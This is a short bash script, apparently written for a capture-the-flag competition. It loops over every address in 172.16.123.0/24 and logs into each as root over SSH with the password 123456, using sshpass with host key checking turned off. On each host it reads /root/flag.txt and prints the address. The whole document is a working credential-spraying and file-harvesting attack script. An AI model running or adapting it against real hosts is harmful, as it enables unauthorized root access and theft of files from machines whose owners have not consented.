for i in $(seq 255)
do
timeout 0.5s sshpass -p 123456 ssh -o"StrictHostKeychecking no" root@172.16.123.$i << EOF
cat /root/flag.txt
echo ---------------------IP:172.16.123.$i---------------------
exit
EOF
done
